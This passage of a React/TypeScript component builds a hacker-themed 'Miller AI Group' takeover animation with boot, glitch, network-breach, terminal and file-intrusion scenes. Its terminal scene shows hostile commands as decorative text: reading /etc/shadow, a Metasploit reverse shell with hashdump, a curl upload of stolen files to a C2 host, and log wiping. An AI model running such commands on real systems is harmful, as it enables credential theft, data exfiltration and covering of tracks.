'use client'

import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { motion, AnimatePresence } from 'framer-motion'

// Import our advanced effects and components
import {
  GlitchCanvas,
  PerspectiveGrid,
  DataStreamRain,
  ScreenShake,
  ChromaticText,
  GlitchTyper,
  HUDBrackets,
  ScanLineOverlay,
  Flicker,
  GlitchProgressBar,
  AlertBox
} from './effects-engine'

import {
  CharacterPortraitCanvas,
  CharacterDossierCard,
  OPERATIVES,
  type Character
} from './character-portraits'

// ============================================
// TYPES
// ============================================
type SceneType =
  | 'boot'
  | 'interference'
  | 'network-breach'
  | 'terminal-takeover'
  | 'file-intrusion'
  | 'character-briefing'
  | 'system-owned'
  | 'complete'

interface CinematicTakeoverProps {
  onComplete: () => void
  userName?: string
  initialStage?: string
}

// Re-export CHARACTERS for backwards compatibility
export { OPERATIVES as CHARACTERS }

// ============================================
// DEDSEC-STYLE DITHER EFFECT CANVAS
// ============================================
function DedSecBackground({ intensity = 1 }: { intensity?: number }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const frameRef = useRef(0)
  const animationRef = useRef<number | undefined>(undefined)

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const resize = () => {
      canvas.width = window.innerWidth
      canvas.height = window.innerHeight
    }
    resize()
    window.addEventListener('resize', resize)

    // DedSec style patterns
    const patterns = ['█', '▓', '▒', '░', '▄', '▀', '■', '□', '●', '○']

    const animate = () => {
      frameRef.current++

      // Dark base with slight noise
      ctx.fillStyle = '#000000'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Scanline effect
      for (let y = 0; y < canvas.height; y += 3) {
        ctx.fillStyle = `rgba(255,255,255,${0.02 * intensity})`
        ctx.fillRect(0, y, canvas.width, 1)
      }

      // Random glitch blocks
      if (Math.random() > 0.95) {
        const blockCount = Math.floor(Math.random() * 5 * intensity)
        for (let i = 0; i < blockCount; i++) {
          const x = Math.random() * canvas.width
          const y = Math.random() * canvas.height
          const w = Math.random() * 200 + 50
          const h = Math.random() * 20 + 5
          ctx.fillStyle = `rgba(${Math.random() > 0.5 ? '255,0,255' : '0,255,255'},${Math.random() * 0.3})`
          ctx.fillRect(x, y, w, h)
        }
      }

      // Floating data characters (DedSec style)
      ctx.font = '12px monospace'
      for (let i = 0; i < 30 * intensity; i++) {
        const x = (frameRef.current * (i % 5 + 1) + i * 50) % canvas.width
        const y = (frameRef.current * 0.5 + i * 30) % canvas.height
        ctx.fillStyle = `rgba(255,0,255,${Math.random() * 0.3})`
        ctx.fillText(patterns[Math.floor(Math.random() * patterns.length)], x, y)
      }

      // Horizontal interference lines
      if (Math.random() > 0.9) {
        const y = Math.random() * canvas.height
        ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.5})`
        ctx.fillRect(0, y, canvas.width, Math.random() * 3 + 1)
      }

      animationRef.current = requestAnimationFrame(animate)
    }

    animate()

    return () => {
      window.removeEventListener('resize', resize)
      if (animationRef.current) cancelAnimationFrame(animationRef.current)
    }
  }, [intensity])

  return <canvas ref={canvasRef} className="fixed inset-0 z-0" />
}

// ============================================
// SCENE 1: BOOT SEQUENCE
// ============================================
function BootSequence({ onComplete }: { onComplete: () => void }) {
  const [lines, setLines] = useState<string[]>([])
  const bootLines = useMemo(() => [
    'BIOS Version 4.2.1 - Miller AI Systems',
    'Detecting hardware...',
    'CPU: Intel Core i9-13900K @ 5.8GHz',
    'RAM: 64GB DDR5-6400',
    'GPU: NVIDIA RTX 4090',
    'Storage: 4TB NVMe SSD',
    '',
    'POST complete.',
    'Loading kernel...',
    '',
    '██████████████████████████████ 100%',
    '',
    'KERNEL PANIC - NOT SYNCING',
    '[ERROR] Unauthorized access detected',
    '[ERROR] Unknown entity in kernel space',
    '[CRITICAL] System integrity compromised',
    '',
    '> EXTERNAL BREACH DETECTED',
    '> INITIATING LOCKDOWN...',
    '> LOCKDOWN FAILED',
    '',
    '>>> MILLER AI GROUP HAS ENTERED THE SYSTEM <<<',
  ], [])

  useEffect(() => {
    let i = 0
    const interval = setInterval(() => {
      if (i < bootLines.length) {
        setLines(prev => [...prev, bootLines[i]])
        i++
      } else {
        clearInterval(interval)
        setTimeout(onComplete, 1500)
      }
    }, 120)
    return () => clearInterval(interval)
  }, [bootLines, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-10 bg-black p-8 font-mono text-sm overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      {/* CRT effect overlay */}
      <div className="absolute inset-0 pointer-events-none" style={{
        background: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px)',
      }} />

      {/* Curved screen effect */}
      <div className="absolute inset-0 pointer-events-none" style={{
        boxShadow: 'inset 0 0 150px rgba(0,0,0,0.9)',
        borderRadius: '20px',
      }} />

      <div className="relative z-10">
        {lines.map((line, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className={`
              ${line?.includes('ERROR') || line?.includes('CRITICAL') ? 'text-red-500' : ''}
              ${line?.includes('MILLER') ? 'text-fuchsia-500 font-bold text-lg' : ''}
              ${line?.includes('███') ? 'text-green-500' : ''}
              ${!line?.includes('ERROR') && !line?.includes('CRITICAL') && !line?.includes('MILLER') && !line?.includes('███') ? 'text-green-400' : ''}
            `}
          >
            {line}
          </motion.div>
        ))}
        <motion.span
          className="text-green-400"
          animate={{ opacity: [1, 0] }}
          transition={{ duration: 0.5, repeat: Infinity }}
        >
          █
        </motion.span>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 2: INTERFERENCE / STATIC TAKEOVER
// ============================================
function InterferenceScene({ onComplete }: { onComplete: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [showMessage, setShowMessage] = useState(false)
  const [messageIndex, setMessageIndex] = useState(0)

  const messages = useMemo(() => [
    'W̷̢̛E̵͎͝ ̴̱̈́A̸̰͝R̵͓̈E̷̲͑ ̶̣̌Ẅ̵̰́A̴̝͘T̵̰̕C̵̣͌H̵͇̊Ḯ̴͜N̸̰͒G̷̱̈',
    'Y̷̨͠O̵͔̓U̵̗͛R̶̨̈ ̷̮͝S̵̱̈́Y̶̧̛S̴̱͑T̵̰͘E̵͇̕M̴̝̊ ̷̱̈I̶̧̛S̵̱̊ ̷̮̈́Ö̷̧́Ụ̶̈R̷̨͝S̴̱̕',
    'R̷̨͝E̵͔͝S̴̱͑I̵̗̊S̴̱̕T̵̰͑Å̵̝Ṉ̷̈Ç̶̛E̵͔͝ ̷̮̈́I̵̗̊S̴̱̕ ̷̮͝F̵̗̊U̵̗͛T̵̰̕I̵̗̊L̵͔͝E̵͔͝',
  ], [])

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    let frame = 0
    let animationId: number

    const animate = () => {
      frame++

      // Heavy static noise
      const imageData = ctx.createImageData(canvas.width, canvas.height)
      for (let i = 0; i < imageData.data.length; i += 4) {
        const noise = Math.random() * 255
        const glitch = Math.random() > 0.99
        imageData.data[i] = glitch ? 255 : noise * 0.3     // R
        imageData.data[i + 1] = glitch ? 0 : noise * 0.3   // G
        imageData.data[i + 2] = glitch ? 255 : noise * 0.3 // B
        imageData.data[i + 3] = 255                         // A
      }
      ctx.putImageData(imageData, 0, 0)

      // Horizontal tear lines
      for (let i = 0; i < 10; i++) {
        const y = (frame * 3 + i * 100) % canvas.height
        ctx.fillStyle = `rgba(255,0,255,${Math.random() * 0.8})`
        ctx.fillRect(0, y, canvas.width, Math.random() * 10 + 2)
      }

      // RGB shift blocks
      if (Math.random() > 0.8) {
        const y = Math.random() * canvas.height
        const h = Math.random() * 50 + 20
        ctx.fillStyle = 'rgba(255,0,0,0.5)'
        ctx.fillRect(Math.random() * 20 - 10, y, canvas.width, h)
        ctx.fillStyle = 'rgba(0,255,255,0.5)'
        ctx.fillRect(Math.random() * 20 - 10 + 5, y, canvas.width, h)
      }

      animationId = requestAnimationFrame(animate)
    }

    animate()

    // Show glitched messages
    setTimeout(() => setShowMessage(true), 500)
    const msgInterval = setInterval(() => {
      setMessageIndex(prev => (prev + 1) % messages.length)
    }, 800)

    // Complete after dramatic pause
    const timer = setTimeout(onComplete, 4000)

    return () => {
      cancelAnimationFrame(animationId)
      clearInterval(msgInterval)
      clearTimeout(timer)
    }
  }, [messages, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <canvas ref={canvasRef} className="absolute inset-0" />

      <AnimatePresence>
        {showMessage && (
          <motion.div
            className="absolute inset-0 flex items-center justify-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <motion.h1
              key={messageIndex}
              className="text-6xl md:text-8xl font-bold font-mono text-center px-4"
              style={{
                color: '#ff00ff',
                textShadow: '0 0 50px #ff00ff, 4px 0 0 #00ffff, -4px 0 0 #ff0000',
                filter: 'blur(0.5px)',
              }}
              initial={{ scale: 0.5, opacity: 0 }}
              animate={{
                scale: [1, 1.05, 1],
                opacity: 1,
                x: [0, -5, 5, -3, 0],
              }}
              transition={{ duration: 0.3 }}
            >
              {messages[messageIndex]}
            </motion.h1>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

// ============================================
// SCENE 3: NETWORK BREACH VISUALIZATION
// ============================================
function NetworkBreachScene({ onComplete }: { onComplete: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [breachedNodes, setBreachedNodes] = useState(0)
  const [status, setStatus] = useState('SCANNING NETWORK...')

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    const centerX = canvas.width / 2
    const centerY = canvas.height / 2

    // Create network nodes
    const nodes: Array<{
      x: number
      y: number
      label: string
      breached: boolean
      connections: number[]
    }> = []

    // Central target
    nodes.push({ x: centerX, y: centerY, label: 'TARGET', breached: false, connections: [] })

    // Surrounding nodes
    const nodeLabels = [
      'FIREWALL', 'ROUTER', 'DATABASE', 'AUTH_SRV', 'WEB_SRV',
      'MAIL_SRV', 'FILE_SRV', 'BACKUP', 'DMZ', 'PROXY',
      'DNS', 'LDAP', 'API_GW', 'CACHE', 'MONITOR'
    ]

    for (let i = 0; i < 15; i++) {
      const angle = (i / 15) * Math.PI * 2
      const radius = 150 + Math.random() * 100
      nodes.push({
        x: centerX + Math.cos(angle) * radius,
        y: centerY + Math.sin(angle) * radius,
        label: nodeLabels[i],
        breached: false,
        connections: [0, (i + 1) % 15 + 1, (i + 8) % 15 + 1]
      })
    }

    let frame = 0
    let animationId: number
    let currentBreach = 1

    const animate = () => {
      frame++

      // Dark background with grid
      ctx.fillStyle = '#0a0a0a'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Grid
      ctx.strokeStyle = 'rgba(255,0,255,0.1)'
      ctx.lineWidth = 1
      for (let x = 0; x < canvas.width; x += 40) {
        ctx.beginPath()
        ctx.moveTo(x, 0)
        ctx.lineTo(x, canvas.height)
        ctx.stroke()
      }
      for (let y = 0; y < canvas.height; y += 40) {
        ctx.beginPath()
        ctx.moveTo(0, y)
        ctx.lineTo(canvas.width, y)
        ctx.stroke()
      }

      // Draw connections
      nodes.forEach((node, i) => {
        node.connections.forEach(targetIdx => {
          const target = nodes[targetIdx]
          if (!target) return

          ctx.beginPath()
          ctx.moveTo(node.x, node.y)
          ctx.lineTo(target.x, target.y)
          ctx.strokeStyle = node.breached && target.breached
            ? 'rgba(255,0,255,0.8)'
            : 'rgba(0,255,255,0.2)'
          ctx.lineWidth = node.breached && target.breached ? 3 : 1
          ctx.stroke()

          // Data packet animation on breached connections
          if (node.breached && target.breached) {
            const progress = (frame % 60) / 60
            const px = node.x + (target.x - node.x) * progress
            const py = node.y + (target.y - node.y) * progress
            ctx.fillStyle = '#ff00ff'
            ctx.beginPath()
            ctx.arc(px, py, 4, 0, Math.PI * 2)
            ctx.fill()
          }
        })
      })

      // Draw nodes
      nodes.forEach((node, i) => {
        // Node glow
        if (node.breached) {
          ctx.beginPath()
          ctx.arc(node.x, node.y, 35, 0, Math.PI * 2)
          const gradient = ctx.createRadialGradient(node.x, node.y, 0, node.x, node.y, 35)
          gradient.addColorStop(0, 'rgba(255,0,255,0.5)')
          gradient.addColorStop(1, 'transparent')
          ctx.fillStyle = gradient
          ctx.fill()
        }

        // Node circle
        ctx.beginPath()
        ctx.arc(node.x, node.y, i === 0 ? 30 : 20, 0, Math.PI * 2)
        ctx.fillStyle = node.breached ? '#ff00ff' : '#1a1a1a'
        ctx.strokeStyle = node.breached ? '#ff00ff' : '#00ffff'
        ctx.lineWidth = 2
        ctx.fill()
        ctx.stroke()

        // Node label
        ctx.font = 'bold 10px monospace'
        ctx.fillStyle = node.breached ? '#ffffff' : '#00ffff'
        ctx.textAlign = 'center'
        ctx.fillText(node.label, node.x, node.y + 35)

        // Breach animation
        if (node.breached) {
          ctx.font = 'bold 12px monospace'
          ctx.fillStyle = '#ff0040'
          ctx.fillText('PWNED', node.x, node.y + 4)
        }
      })

      // Scanning effect
      const scanY = (frame * 3) % canvas.height
      ctx.fillStyle = 'rgba(0,255,255,0.1)'
      ctx.fillRect(0, scanY, canvas.width, 5)

      animationId = requestAnimationFrame(animate)
    }

    animate()

    // Breach nodes progressively
    const breachInterval = setInterval(() => {
      if (currentBreach < nodes.length) {
        nodes[currentBreach].breached = true
        setBreachedNodes(currentBreach)

        if (currentBreach === 1) setStatus('BYPASSING FIREWALL...')
        if (currentBreach === 3) setStatus('ACCESSING DATABASE...')
        if (currentBreach === 5) setStatus('ESCALATING PRIVILEGES...')
        if (currentBreach === 10) setStatus('INSTALLING BACKDOORS...')
        if (currentBreach === 14) {
          setStatus('NETWORK COMPROMISED')
          nodes[0].breached = true // Breach central target
        }

        currentBreach++
      } else {
        clearInterval(breachInterval)
        setTimeout(onComplete, 2000)
      }
    }, 300)

    return () => {
      cancelAnimationFrame(animationId)
      clearInterval(breachInterval)
    }
  }, [onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <canvas ref={canvasRef} className="absolute inset-0" />

      {/* HUD Overlay */}
      <div className="absolute top-4 left-4 font-mono text-sm">
        <div className="text-fuchsia-500 mb-2">{'>'} NETWORK INTRUSION ACTIVE</div>
        <div className="text-cyan-400">NODES COMPROMISED: {breachedNodes}/15</div>
        <div className="text-yellow-400 mt-2">{status}</div>
      </div>

      {/* Progress bar */}
      <div className="absolute bottom-8 left-8 right-8">
        <div className="h-2 bg-neutral-800 rounded overflow-hidden">
          <motion.div
            className="h-full bg-fuchsia-500"
            initial={{ width: '0%' }}
            animate={{ width: `${(breachedNodes / 15) * 100}%` }}
            transition={{ duration: 0.3 }}
          />
        </div>
        <div className="text-center mt-2 font-mono text-xs text-fuchsia-400">
          BREACH PROGRESS: {Math.round((breachedNodes / 15) * 100)}%
        </div>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 4: TERMINAL TAKEOVER
// ============================================
function TerminalTakeoverScene({ onComplete }: { onComplete: () => void }) {
  const [terminals, setTerminals] = useState<Array<{
    id: number
    lines: string[]
    x: number
    y: number
    title: string
  }>>([])

  const terminalCommands = useMemo(() => ({
    main: [
      '$ whoami',
      'root',
      '$ cat /etc/shadow',
      'root:$6$xyz....:19000:0:99999:7:::',
      'admin:$6$abc....:19000:0:99999:7:::',
      '$ ls -la /home',
      'drwxr-xr-x  5 root root  4096 Dec 28 04:20 .',
      'drwxr-xr-x 18 root root  4096 Dec 28 04:20 ..',
      'drwxr-xr-x  3 admin admin 4096 Dec 28 04:20 admin',
      '$ ./miller_payload --inject',
      '[*] Injecting payload into kernel...',
      '[+] Payload injected successfully',
      '[+] Establishing persistence...',
      '[+] C2 callback established',
    ],
    exploit: [
      '$ msfconsole -q',
      'msf6 > use exploit/multi/handler',
      'msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp',
      'msf6 > set LHOST 10.0.0.1',
      'msf6 > exploit',
      '[*] Started reverse TCP handler on 10.0.0.1:4444',
      '[*] Meterpreter session 1 opened',
      'meterpreter > getsystem',
      '[+] Got SYSTEM privileges',
      'meterpreter > hashdump',
      '[+] Dumping password hashes...',
    ],
    exfil: [
      '$ find / -name "*.key" 2>/dev/null',
      '/etc/ssl/private/server.key',
      '/home/admin/.ssh/id_rsa',
      '$ tar -czf loot.tar.gz /etc/ssl /home',
      '$ curl -X POST -F "file=@loot.tar.gz" https://c2.miller-ai.group/upload',
      '{"status":"success","size":"2.4GB"}',
      '$ rm -rf /var/log/*',
      '$ history -c',
      '[+] Tracks covered',
    ],
  }), [])

  useEffect(() => {
    // Spawn terminals over time
    const spawnTimers: NodeJS.Timeout[] = []

    spawnTimers.push(setTimeout(() => {
      setTerminals(prev => [...prev, {
        id: 1,
        lines: [],
        x: 50,
        y: 50,
        title: 'root@target:~#'
      }])
    }, 0))

    spawnTimers.push(setTimeout(() => {
      setTerminals(prev => [...prev, {
        id: 2,
        lines: [],
        x: 500,
        y: 100,
        title: 'msf6>'
      }])
    }, 2000))

    spawnTimers.push(setTimeout(() => {
      setTerminals(prev => [...prev, {
        id: 3,
        lines: [],
        x: 200,
        y: 350,
        title: 'exfil@c2:~#'
      }])
    }, 4000))

    // Type into terminals
    let mainLine = 0
    let exploitLine = 0
    let exfilLine = 0

    const typeInterval = setInterval(() => {
      setTerminals(prev => prev.map(t => {
        if (t.id === 1 && mainLine < terminalCommands.main.length) {
          mainLine++
          return { ...t, lines: terminalCommands.main.slice(0, mainLine) }
        }
        if (t.id === 2 && exploitLine < terminalCommands.exploit.length) {
          exploitLine++
          return { ...t, lines: terminalCommands.exploit.slice(0, exploitLine) }
        }
        if (t.id === 3 && exfilLine < terminalCommands.exfil.length) {
          exfilLine++
          return { ...t, lines: terminalCommands.exfil.slice(0, exfilLine) }
        }
        return t
      }))
    }, 200)

    const completeTimer = setTimeout(onComplete, 10000)

    return () => {
      spawnTimers.forEach(clearTimeout)
      clearInterval(typeInterval)
      clearTimeout(completeTimer)
    }
  }, [terminalCommands, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DedSecBackground intensity={0.5} />

      {/* Terminal windows */}
      <AnimatePresence>
        {terminals.map(terminal => (
          <motion.div
            key={terminal.id}
            className="absolute rounded-lg overflow-hidden shadow-2xl"
            style={{
              left: terminal.x,
              top: terminal.y,
              width: 450,
              background: 'rgba(0,0,0,0.95)',
              border: '1px solid rgba(0,255,65,0.5)',
              boxShadow: '0 0 30px rgba(0,255,65,0.3)',
            }}
            initial={{ opacity: 0, scale: 0.8, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
          >
            {/* Title bar */}
            <div className="px-3 py-2 flex items-center gap-2 bg-neutral-900 border-b border-green-500/30">
              <div className="flex gap-1.5">
                <div className="w-3 h-3 rounded-full bg-red-500" />
                <div className="w-3 h-3 rounded-full bg-yellow-500" />
                <div className="w-3 h-3 rounded-full bg-green-500" />
              </div>
              <span className="text-xs font-mono text-green-400 ml-2">{terminal.title}</span>
            </div>

            {/* Content */}
            <div className="p-3 font-mono text-xs h-48 overflow-y-auto bg-black/80">
              {terminal.lines.map((line, i) => (
                <div
                  key={i}
                  className={`leading-relaxed ${
                    line?.startsWith('$') || line?.startsWith('msf') || line?.startsWith('meterpreter')
                      ? 'text-green-400'
                      : line?.startsWith('[+]')
                        ? 'text-green-500'
                        : line?.startsWith('[*]')
                          ? 'text-cyan-400'
                          : line?.startsWith('[!]')
                            ? 'text-red-500'
                            : 'text-neutral-300'
                  }`}
                >
                  {line}
                </div>
              ))}
              <motion.span
                className="text-green-400"
                animate={{ opacity: [1, 0] }}
                transition={{ duration: 0.5, repeat: Infinity }}
              >
                █
              </motion.span>
            </div>
          </motion.div>
        ))}
      </AnimatePresence>

      {/* Status */}
      <div className="absolute top-4 right-4 font-mono text-sm text-right">
        <div className="text-fuchsia-500">MILLER AI GROUP</div>
        <div className="text-cyan-400 text-xs">OPERATION: SYSTEM TAKEOVER</div>
        <motion.div
          className="text-red-500 text-xs mt-2"
          animate={{ opacity: [1, 0.3, 1] }}
          transition={{ duration: 0.5, repeat: Infinity }}
        >
          ● RECORDING
        </motion.div>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 5: FILE INTRUSION - Advanced Tree View
// ============================================

interface FileNode {
  name: string
  path: string
  type: 'file' | 'folder'
  children?: FileNode[]
  size?: string
  permissions?: string
  status: 'hidden' | 'scanning' | 'accessed' | 'encrypted' | 'exfiltrated'
  sensitive?: boolean
}

function FileTreeNode({ node, depth = 0, onStatusChange }: {
  node: FileNode
  depth?: number
  onStatusChange?: (path: string, status: FileNode['status']) => void
}) {
  const [isExpanded, setIsExpanded] = useState(true)

  const statusColors = {
    hidden: 'text-neutral-600',
    scanning: 'text-yellow-400',
    accessed: 'text-cyan-400',
    encrypted: 'text-orange-500',
    exfiltrated: 'text-green-500'
  }

  const statusIcons = {
    hidden: '○',
    scanning: '◐',
    accessed: '◉',
    encrypted: '🔒',
    exfiltrated: '✓'
  }

  return (
    <motion.div
      initial={{ opacity: 0, x: -10 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.2 }}
    >
      <div
        className={`flex items-center gap-2 py-1 px-2 rounded hover:bg-white/5 cursor-pointer ${
          node.sensitive ? 'bg-red-500/10' : ''
        }`}
        style={{ paddingLeft: depth * 16 + 8 }}
        onClick={() => node.type === 'folder' && setIsExpanded(!isExpanded)}
      >
        {/* Expand/collapse icon for folders */}
        {node.type === 'folder' && (
          <motion.span
            className="text-neutral-500 text-xs w-3"
            animate={{ rotate: isExpanded ? 90 : 0 }}
          >
            ▶
          </motion.span>
        )}
        {node.type === 'file' && <span className="w-3" />}

        {/* Icon */}
        <span className={node.type === 'folder' ? 'text-blue-400' : 'text-neutral-400'}>
          {node.type === 'folder' ? '📁' : node.sensitive ? '🔴' : '📄'}
        </span>

        {/* Name */}
        <span className={`flex-1 font-mono text-sm ${
          node.sensitive ? 'text-red-400' : 'text-neutral-300'
        }`}>
          {node.name}
        </span>

        {/* Size */}
        {node.size && (
          <span className="text-xs text-neutral-600 font-mono">{node.size}</span>
        )}

        {/* Permissions */}
        {node.permissions && (
          <span className="text-xs text-neutral-700 font-mono">{node.permissions}</span>
        )}

        {/* Status indicator */}
        <motion.span
          className={`text-sm ${statusColors[node.status]}`}
          animate={node.status === 'scanning' ? { opacity: [1, 0.3, 1] } : {}}
          transition={{ duration: 0.5, repeat: Infinity }}
        >
          {statusIcons[node.status]}
        </motion.span>
      </div>

      {/* Children */}
      <AnimatePresence>
        {node.type === 'folder' && isExpanded && node.children && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
          >
            {node.children.map((child, i) => (
              <FileTreeNode key={child.path} node={child} depth={depth + 1} />
            ))}
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

function FileIntrusionScene({ onComplete }: { onComplete: () => void }) {
  const [fileTree, setFileTree] = useState<FileNode[]>([])
  const [currentAction, setCurrentAction] = useState('')
  const [alerts, setAlerts] = useState<Array<{ id: string; type: string; title: string; message: string }>>([])
  const [stats, setStats] = useState({ scanned: 0, accessed: 0, exfiltrated: 0, totalSize: 0 })

  const initialFileTree: FileNode[] = useMemo(() => [
    {
      name: '/',
      path: '/',
      type: 'folder',
      status: 'hidden',
      children: [
        {
          name: 'etc',
          path: '/etc',
          type: 'folder',
          status: 'hidden',
          children: [
            { name: 'passwd', path: '/etc/passwd', type: 'file', size: '2.4KB', permissions: '-rw-r--r--', status: 'hidden', sensitive: true },
            { name: 'shadow', path: '/etc/shadow', type: 'file', size: '1.8KB', permissions: '-rw-------', status: 'hidden', sensitive: true },
            {
              name: 'ssl',
              path: '/etc/ssl',
              type: 'folder',
              status: 'hidden',
              children: [
                {
                  name: 'private',
                  path: '/etc/ssl/private',
                  type: 'folder',
                  status: 'hidden',
                  children: [
                    { name: 'server.key', path: '/etc/ssl/private/server.key', type: 'file', size: '4.1KB', permissions: '-rw-------', status: 'hidden', sensitive: true },
                    { name: 'ca-cert.pem', path: '/etc/ssl/private/ca-cert.pem', type: 'file', size: '2.2KB', permissions: '-rw-------', status: 'hidden', sensitive: true }
                  ]
                }
              ]
            }
          ]
        },
        {
          name: 'home',
          path: '/home',
          type: 'folder',
          status: 'hidden',
          children: [
            {
              name: 'admin',
              path: '/home/admin',
              type: 'folder',
              status: 'hidden',
              children: [
                {
                  name: '.ssh',
                  path: '/home/admin/.ssh',
                  type: 'folder',
                  status: 'hidden',
                  children: [
                    { name: 'id_rsa', path: '/home/admin/.ssh/id_rsa', type: 'file', size: '3.2KB', permissions: '-rw-------', status: 'hidden', sensitive: true },
                    { name: 'id_rsa.pub', path: '/home/admin/.ssh/id_rsa.pub', type: 'file', size: '0.7KB', permissions: '-rw-r--r--', status: 'hidden' },
                    { name: 'authorized_keys', path: '/home/admin/.ssh/authorized_keys', type: 'file', size: '2.1KB', permissions: '-rw-r--r--', status: 'hidden', sensitive: true }
                  ]
                },
                { name: '.bash_history', path: '/home/admin/.bash_history', type: 'file', size: '48KB', permissions: '-rw-------', status: 'hidden', sensitive: true },
                { name: '.aws', path: '/home/admin/.aws', type: 'folder', status: 'hidden', children: [
                  { name: 'credentials', path: '/home/admin/.aws/credentials', type: 'file', size: '0.4KB', permissions: '-rw-------', status: 'hidden', sensitive: true },
                  { name: 'config', path: '/home/admin/.aws/config', type: 'file', size: '0.2KB', permissions: '-rw-r--r--', status: 'hidden' }
                ]}
              ]
            }
          ]
        },
        {
          name: 'var',
          path: '/var',
          type: 'folder',
          status: 'hidden',
          children: [
            {
              name: 'lib',
              path: '/var/lib',
              type: 'folder',
              status: 'hidden',
              children: [
                {
                  name: 'mysql',
                  path: '/var/lib/mysql',
                  type: 'folder',
                  status: 'hidden',
                  children: [
                    { name: 'users.db', path: '/var/lib/mysql/users.db', type: 'file', size: '847MB', permissions: '-rw-rw----', status: 'hidden', sensitive: true },
                    { name: 'transactions.db', path: '/var/lib/mysql/transactions.db', type: 'file', size: '2.4GB', permissions: '-rw-rw----', status: 'hidden', sensitive: true }
                  ]
                }
              ]
            },
            {
              name: 'log',
              path: '/var/log',
              type: 'folder',
              status: 'hidden',
              children: [
                { name: 'auth.log', path: '/var/log/auth.log', type: 'file', size: '12MB', permissions: '-rw-r-----', status: 'hidden' },
                { name: 'syslog', path: '/var/log/syslog', type: 'file', size: '45MB', permissions: '-rw-r-----', status: 'hidden' }
              ]
            }
          ]
        },
        {
          name: 'opt',
          path: '/opt',
          type: 'folder',
          status: 'hidden',
          children: [
            {
              name: 'app',
              path: '/opt/app',
              type: 'folder',
              status: 'hidden',
              children: [
                { name: '.env', path: '/opt/app/.env', type: 'file', size: '1.2KB', permissions: '-rw-------', status: 'hidden', sensitive: true },
                { name: 'config.json', path: '/opt/app/config.json', type: 'file', size: '4.8KB', permissions: '-rw-r--r--', status: 'hidden', sensitive: true },
                { name: 'secrets.enc', path: '/opt/app/secrets.enc', type: 'file', size: '0.8KB', permissions: '-rw-------', status: 'hidden', sensitive: true }
              ]
            }
          ]
        }
      ]
    }
  ], [])

  // Flatten tree to get all paths
  const flattenTree = useCallback((nodes: FileNode[]): FileNode[] => {
    const result: FileNode[] = []
    const traverse = (items: FileNode[]) => {
      items.forEach(item => {
        result.push(item)
        if (item.children) traverse(item.children)
      })
    }
    traverse(nodes)
    return result
  }, [])

  // Update status of a node by path
  const updateNodeStatus = useCallback((tree: FileNode[], path: string, status: FileNode['status']): FileNode[] => {
    return tree.map(node => {
      if (node.path === path) {
        return { ...node, status }
      }
      if (node.children) {
        return { ...node, children: updateNodeStatus(node.children, path, status) }
      }
      return node
    })
  }, [])

  useEffect(() => {
    // Initialize tree
    setFileTree(initialFileTree)

    const allPaths = flattenTree(initialFileTree).filter(n => n.path !== '/')
    let currentIndex = 0

    const processFile = () => {
      if (currentIndex >= allPaths.length) {
        setCurrentAction('EXFILTRATION COMPLETE - CLEANING TRACES...')
        setTimeout(() => {
          setCurrentAction('TRACKS COVERED - DISCONNECTING...')
          setTimeout(onComplete, 1500)
        }, 1500)
        return
      }

      const node = allPaths[currentIndex]
      const isSensitive = node.sensitive

      // Phase 1: Scanning
      setCurrentAction(`SCANNING: ${node.path}`)
      setFileTree(prev => updateNodeStatus(prev, node.path, 'scanning'))
      setStats(prev => ({ ...prev, scanned: prev.scanned + 1 }))

      setTimeout(() => {
        // Phase 2: Accessed
        setFileTree(prev => updateNodeStatus(prev, node.path, 'accessed'))
        setStats(prev => ({ ...prev, accessed: prev.accessed + 1 }))

        if (isSensitive) {
          setAlerts(prev => [...prev.slice(-2), {
            id: Math.random().toString(),
            type: 'warning',
            title: 'SENSITIVE FILE DETECTED',
            message: `${node.path} contains valuable data`
          }])
        }

        setTimeout(() => {
          // Phase 3: Exfiltrated (if sensitive) or just mark complete
          if (node.type === 'file') {
            setFileTree(prev => updateNodeStatus(prev, node.path, 'exfiltrated'))
            setStats(prev => ({
              ...prev,
              exfiltrated: prev.exfiltrated + 1,
